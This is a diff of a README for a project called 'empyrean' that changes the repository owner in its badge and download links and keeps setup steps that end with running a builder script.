@@ -1,14 +1,14 @@
 <img src="img/banner.png" width="100%" height="100%" />
 
 <div align="center">
-    <img src="https://img.shields.io/github/languages/top/addi00000/empyrean?color=%23000000">
-    <img src="https://img.shields.io/github/stars/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/languages/top/rqss-pyml/empyrean?color=%23000000">
+    <img src="https://img.shields.io/github/stars/rqss-pyml/empyrean?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/addi00000/empyrean?color=%23000000"> 
-    <img src="https://img.shields.io/github/last-commit/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/commit-activity/w/rqss-pyml/empyrean?color=%23000000"> 
+    <img src="https://img.shields.io/github/last-commit/rqss-pyml/empyrean?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues/rqss-pyml/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues-closed/rqss-pyml/empyrean?color=%23000000&logoColor=%23000000">
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
@@ -37,7 +37,7 @@
 <details>
     <summary>For dummies</summary>
     <ol>
-        <li><a href="https://github.com/addi00000/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
+        <li><a href="https://github.com/rqss-pyml/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
         <li>Extract zip</li>
         <li>Run <code>install_python.bat</code></li>
         <li>Run the builder by double clicking the <code>build.bat</code> file</li>
